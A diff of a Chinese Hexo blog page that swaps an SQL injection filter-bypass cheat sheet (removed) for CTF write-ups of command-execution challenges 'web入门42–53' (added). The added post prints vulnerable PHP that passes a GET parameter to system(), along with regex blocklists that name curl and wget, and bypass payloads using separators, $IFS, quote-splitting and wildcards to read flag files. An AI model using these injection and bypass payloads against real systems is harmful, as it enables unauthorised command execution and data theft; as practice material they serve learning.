@@ -19,29 +19,27 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.14.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="绕过常见方式注释#,–,– -,–+,&#x2F;&#x2F;,&#x2F;**&#x2F;,&#x2F;letmetest&#x2F;,;%00 空格可以代替空格的字符&#x2F;**&#x2F;,(),+,%20,%09,%0a,0x0a,0x0b,0x0c,0x0d等还可以使用+,-,~,.等例如:union+select+1,2 编码hex编码，URL编码，宽字节，Unicode编码(iis支持)URL编码:%6f%72%20%31%3d%31(and 1&#x3D;1)Uni">
+    <meta name="description" content="web入门42if(isset($_GET[‘c’])){  $c&#x3D;$_GET[‘c’];  system($c.” &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”);}else{  highlight_file(FILE);}shell脚本——&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 详解含义：&gt;代表重定向到哪&#x2F;dev&#x2F;null空设备文件，所有写入的内容都会丢失，俗称黑洞1">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sql注入之bypass技巧">
-<meta property="og:url" content="http://example.com/2023/01/11/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bbypass%E6%8A%80%E5%B7%A7/index.html">
+<meta property="og:title" content="命令执行部分题记">
+<meta property="og:url" content="http://example.com/2023/02/19/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%83%A8%E5%88%86%E9%A2%98%E8%AE%B0/index.html">
 <meta property="og:site_name" content="The future is promising">
-<meta property="og:description" content="绕过常见方式注释#,–,– -,–+,&#x2F;&#x2F;,&#x2F;**&#x2F;,&#x2F;letmetest&#x2F;,;%00 空格可以代替空格的字符&#x2F;**&#x2F;,(),+,%20,%09,%0a,0x0a,0x0b,0x0c,0x0d等还可以使用+,-,~,.等例如:union+select+1,2 编码hex编码，URL编码，宽字节，Unicode编码(iis支持)URL编码:%6f%72%20%31%3d%31(and 1&#x3D;1)Uni">
+<meta property="og:description" content="web入门42if(isset($_GET[‘c’])){  $c&#x3D;$_GET[‘c’];  system($c.” &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”);}else{  highlight_file(FILE);}shell脚本——&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 详解含义：&gt;代表重定向到哪&#x2F;dev&#x2F;null空设备文件，所有写入的内容都会丢失，俗称黑洞1">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-01-11T09:06:37.000Z">
-<meta property="article:modified_time" content="2023-01-11T10:00:02.193Z">
+<meta property="article:published_time" content="2023-02-19T14:02:12.000Z">
+<meta property="article:modified_time" content="2023-02-19T14:06:56.117Z">
 <meta property="article:author" content="清者">
-<meta property="article:tag" content="拼搏">
-<meta property="article:tag" content="奋斗">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="http://example.com/2023/01/11/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bbypass%E6%8A%80%E5%B7%A7/">
+<link rel="canonical" href="http://example.com/2023/02/19/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%83%A8%E5%88%86%E9%A2%98%E8%AE%B0/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/01/11/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bbypass%E6%8A%80%E5%B7%A7/","path":"2023/01/11/sql注入之bypass技巧/","title":"sql注入之bypass技巧"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/02/19/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%83%A8%E5%88%86%E9%A2%98%E8%AE%B0/","path":"2023/02/19/命令执行部分题记/","title":"命令执行部分题记"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>sql注入之bypass技巧 | The future is promising</title>
+<title>命令执行部分题记 | The future is promising</title>
   
 
 
@@ -141,7 +139,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%B8%B8%E8%A7%81%E6%96%B9%E5%BC%8F"><span class="nav-number">1.</span> <span class="nav-text">绕过常见方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E9%87%8A"><span class="nav-number">1.1.</span> <span class="nav-text">注释</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC"><span class="nav-number">1.2.</span> <span class="nav-text">空格</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E7%A0%81"><span class="nav-number">1.3.</span> <span class="nav-text">编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%89%E4%BB%B7%E5%AD%97%E7%AC%A6%E4%BB%A5%E5%8F%8A%E7%AD%89%E4%BB%B7%E5%87%BD%E6%95%B0"><span class="nav-number">1.4.</span> <span class="nav-text">等价字符以及等价函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql%E7%89%B9%E6%80%A7"><span class="nav-number">1.5.</span> <span class="nav-text">mysql特性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E6%8B%86%E5%88%86"><span class="nav-number">1.6.</span> <span class="nav-text">关键字拆分</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A"><span class="nav-number">1.7.</span> <span class="nav-text">内联注释</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-number">1.8.</span> <span class="nav-text">判断注入点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0"><span class="nav-number">1.9.</span> <span class="nav-text">判断列数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="nav-number">1.10.</span> <span class="nav-text">联合查询</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E5%85%A5%E9%97%A842"><span class="nav-number">1.</span> <span class="nav-text">web入门42</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E5%85%A5%E9%97%A843"><span class="nav-number">2.</span> <span class="nav-text">web入门43</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E5%85%A5%E9%97%A844"><span class="nav-number">3.</span> <span class="nav-text">web入门44</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E5%85%A5%E9%97%A845"><span class="nav-number">4.</span> <span class="nav-text">web入门45</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E5%85%A5%E9%97%A846"><span class="nav-number">5.</span> <span class="nav-text">web入门46</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E5%85%A5%E9%97%A848"><span class="nav-number">6.</span> <span class="nav-text">web入门48</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E5%85%A5%E9%97%A852"><span class="nav-number">7.</span> <span class="nav-text">web入门52</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E5%85%A5%E9%97%A853"><span class="nav-number">8.</span> <span class="nav-text">web入门53</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -202,7 +200,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/11/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bbypass%E6%8A%80%E5%B7%A7/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/19/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%83%A8%E5%88%86%E9%A2%98%E8%AE%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/apple-touch-icon-next.png">
@@ -215,12 +213,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="sql注入之bypass技巧 | The future is promising">
+      <meta itemprop="name" content="命令执行部分题记 | The future is promising">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          sql注入之bypass技巧
+          命令执行部分题记
         </h1>
 
         <div class="post-meta-container">
@@ -232,7 +230,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2023-01-11 17:06:37 / 修改时间：18:00:02" itemprop="dateCreated datePublished" datetime="2023-01-11T17:06:37+08:00">2023-01-11</time>
+      <time title="创建时间：2023-02-19 22:02:12 / 修改时间：22:06:56" itemprop="dateCreated datePublished" datetime="2023-02-19T22:02:12+08:00">2023-02-19</time>
     </span>
 
   
@@ -245,16 +243,14 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="绕过常见方式"><a href="#绕过常见方式" class="headerlink" title="绕过常见方式"></a>绕过常见方式</h2><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>#,–,– -,–+,//,/**/,/<em>letmetest</em>/,;%00</p>
-<h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><p>可以代替空格的字符<br>/**/,(),+,%20,%09,%0a,0x0a,0x0b,0x0c,0x0d等<br>还可以使用<br>+,-,~,.等<br>例如:union+select+1,2</p>
-<h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p>hex编码，URL编码，宽字节，Unicode编码(iis支持)<br>URL编码:%6f%72%20%31%3d%31(and 1=1)<br>Unicode编码:un%u0069on</p>
-<h3 id="等价字符以及等价函数"><a href="#等价字符以及等价函数" class="headerlink" title="等价字符以及等价函数"></a>等价字符以及等价函数</h3><p>and==&gt;&amp;&amp;<br>or==&gt;||<br>xor==&gt;^<br>not==&gt;!<br>hex(),bin()==&gt;ascii()<br>concat_ws()==&gt;group_concat()<br>sleep()==&gt;benchmark()<br>mid(),substr()==&gt;substring()<br>@@user==&gt;user()<br>@@datadir==&gt;datadir()</p>
-<h3 id="mysql特性"><a href="#mysql特性" class="headerlink" title="mysql特性"></a>mysql特性</h3><p>mysql中=为等于的意思,只有在update中是赋值<br>:=  赋值<br>@   @加变量名可以直接调用</p>
-<h3 id="关键字拆分"><a href="#关键字拆分" class="headerlink" title="关键字拆分"></a>关键字拆分</h3><p>se’+’le’+’ct’<br>%S%E%L%E%C%T1<br>U/**/NION</p>
-<h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><p>/<em>!Unlon</em>/</p>
-<h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>and 1=1,and ‘a’=’a’,and 1(and 0),and hex(1),and hex(0),and !,/<em>!1</em>/,/<em>!0</em>/,and–+a%0a1/<em>!=</em>/0</p>
-<h3 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h3><p>order by 20 (后面加数字)</p>
-<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>union select 1,2,3,……,得到的列数<br>之后便可以替换掉其中的数字来获取想要的信息</p>
+        <h2 id="web入门42"><a href="#web入门42" class="headerlink" title="web入门42"></a>web入门42</h2><p>if(isset($_GET[‘c’])){<br>  $c=$_GET[‘c’];<br>  system($c.” &gt;/dev/null 2&gt;&amp;1”);<br>}else{<br>  highlight_file(<strong>FILE</strong>);<br>}<br>shell脚本——&gt;/dev/null 2&gt;&amp;1 详解<br>含义：&gt;代表重定向到哪<br>/dev/null空设备文件，所有写入的内容都会丢失，俗称黑洞<br>1表示stdout标准输出，系统默认值为1，&gt;/dev/null等同于1&gt;/dev/null<br>2表示stderr标准错误<br>&amp;表示等同于，2&gt;&amp;1表示2的输出定向等同于1<br>解释：命令1&gt;/dev/null 首先表示标准输出重定向到空设备文件也就是丢弃标准输出。<br>2&gt;&amp;1 接着，标准错误输出重定向等同于 标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也被丢弃。<br>所以该shell命令不会输出任何信息，不回显。<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ultranms/p/9353157.html">https://www.cnblogs.com/ultranms/p/9353157.html</a><br>用 ; 截断<br>url/?c=ls;<br>url/?c=cat flag.php;<br>分隔符<br>；如果每个命令都被一个分号(；)所分隔，那么命令会连续地执行下去<br>&amp;&amp; 执行错误检查命令，如果其左侧的命令不返回预期的结果，其右侧的命令就不会执行<br>&amp; 不执行错误检查和运行所有命令<br>||若遇到可以成功执行的命令，那么命令停止执行，即使后面还有正确的命令。假如命令一开始就执行失败，那么就会执行||后的下一个命令，直到遇到可以成功执行的命令为止，假如所有的都失败，则所有这些失败的命令都会被尝试执行一次<br>|即使遇到可以成功执行的命令，命令也会继续执行下去，并且会显示最后一个命令的执行结果<br>cmd1 | cmd2 只显示cmd2结果<br>cmd1 ; cmd2 无论cmd1是否成功执行，都执行cmd2<br>cmd1 || cmd2 cmd1执行失败时才执行cmd2<br>cmd1 &amp;&amp; cmd2 cmd1执行成功时才执行cmd2</p>
+<h2 id="web入门43"><a href="#web入门43" class="headerlink" title="web入门43"></a>web入门43</h2><p>if(isset($_GET[‘c’])){<br>  $c=$_GET[‘c’];<br>  if(!preg_match(“/;|cat/i”, $c)){<br>    system($c.” &gt;/dev/null 2&gt;&amp;1”);<br>  }<br>}else{<br>  highlight_file(<strong>FILE</strong>);<br>}<br>比上一题多了cat ; 过滤<br>执行命令url/?c=tac flag.php%0a<br>或者执行url/?c=nl flag.php%0a 看源码<br>nl命令：输出文件内容并自动加上行号</p>
+<h2 id="web入门44"><a href="#web入门44" class="headerlink" title="web入门44"></a>web入门44</h2><p>if(isset($_GET[‘c’])){<br>  $c=$_GET[‘c’];<br>  if(!preg_match(“/;|cat|flag/i”, $c)){<br>    system($c.” &gt;/dev/null 2&gt;&amp;1”);<br>  }<br>}else{<br>  highlight_file(<strong>FILE</strong>);<br>}<br>过滤了; cat flag 用通配符*<br>执行命令url/?c=nl f*.php%0a<br>或url/?c=tac f*.php%0a</p>
+<h2 id="web入门45"><a href="#web入门45" class="headerlink" title="web入门45"></a>web入门45</h2><p>if(isset($_GET[‘c’])){<br>  $c=$_GET[‘c’];<br>  if(!preg_match(“/;|cat|flag| /i”, $c)){<br>    system($c.” &gt;/dev/null 2&gt;&amp;1”);<br>  }<br>}else{<br>  highlight_file(<strong>FILE</strong>);<br>}<br>过滤了*; cat flag 空格<br>hint<br>echo$IFS‘tac$IFS<em>’%0A注意反引号<br>``执行系统命令<br>或tac${IFS}f</em>.php%0a<br>或echo${IFS}tac${IFS}f*%0a<br>shell脚本——变量IFS，分隔符<br>作用：shell 根据 IFS 的值，默认是 space, tab, newline 来拆解读入的变量，然后对特殊字符进行处理，最后重新组合赋值给该变量。<br>查看IFS值echo”$IFS<br>$IFS<em>返回所有参数<br>然后输入tac百分号零九f</em>.php百分号零a</p>
+<h2 id="web入门46"><a href="#web入门46" class="headerlink" title="web入门46"></a>web入门46</h2><p>过滤了; cat flag * $ [0-9] 空格<br>nl&lt;fla’’g.php|| 小于号可理解为空格，重定向到后面的文件<br>&lt;是输入重定向<a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-shell-io-redirections.html">https://www.runoob.com/linux/linux-shell-io-redirections.html</a><br>重定向就是通过各种方法将各种网络请求重新定个方向转到其它位置<br>%09与%0a是url编码，不会当成数字被过滤<br>直接输入/?c=tac%09????????%0a便可得到falg<br>?与*都是通配符，?占一个位置，星号占无数个位置</p>
+<h2 id="web入门48"><a href="#web入门48" class="headerlink" title="web入门48"></a>web入门48</h2><p>if(isset($_GET[‘c’])){<br>  $c=$_GET[‘c’];<br>  if(!preg_match(“/;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`/i”, $c)){<br>    system($c.” &gt;/dev/null 2&gt;&amp;1”);<br>  }<br>}else{<br>  highlight_file(<strong>FILE</strong>);<br>}<br>/?c=nl&lt;fla’’g.php|| 即可</p>
+<h2 id="web入门52"><a href="#web入门52" class="headerlink" title="web入门52"></a>web入门52</h2><p>if(isset($_GET[‘c’])){<br>  $c=$_GET[‘c’];<br>  if(!preg_match(“/;|cat|flag| |[0-9]|*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\x09|\x26|&gt;|&lt;/i”, $c)){<br>    system($c.” &gt;/dev/null 2&gt;&amp;1”);<br>  }<br>}else{<br>  highlight_file(<strong>FILE</strong>);<br>}<br>这次把&lt; &gt;都过滤了用$IFS<br>若用nl${IFS}fl\ag.php||命令，会出现假flag，发现flag在根目录，用nl${IFS}/fl\ag.php|| 直接读取<br>或nl$IFS/fla”g||(其中的‘’为单引号)</p>
+<h2 id="web入门53"><a href="#web入门53" class="headerlink" title="web入门53"></a>web入门53</h2><p>if(isset($_GET[‘c’])){<br>  $c=$_GET[‘c’];<br>  if(!preg_match(“/;|cat|flag| |[0-9]|*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\x09|\x26|&gt;|&lt;/i”, $c)){<br>    echo($c);<br>    $d = system($c);<br>    echo “<br>“.$d;<br>  }else{<br>    echo ‘no’;<br>  }<br>}else{<br>  highlight_file(<strong>FILE</strong>);<br>}<br>一定会回显出c,没有&gt;/dev/null 2&gt;&amp;1命令了<br>c”at${IFS}fla”g.php因为cat和flag被过滤了，用”分隔，两个%27也行,或nl${IFS}fla”g.php<br>cat命令实际上运行的也是bin/cat</p>
 
     </div>
 
@@ -263,23 +259,16 @@
     
 
     <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/%E6%8B%BC%E6%90%8F/" rel="tag"># 拼搏</a>
-              <a href="/tags/%E5%A5%8B%E6%96%97/" rel="tag"># 奋斗</a>
-          </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2022/12/16/hello-world/" rel="prev" title="Hello World">
-                  <i class="fa fa-chevron-left"></i> Hello World
+                <a href="/2023/02/15/%E9%83%A8%E5%88%86%E9%A2%98%E8%AE%B0/" rel="prev" title="部分题记">
+                  <i class="fa fa-chevron-left"></i> 部分题记
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2023/01/13/sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" rel="next" title="sql 手工注入">
-                  sql 手工注入 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
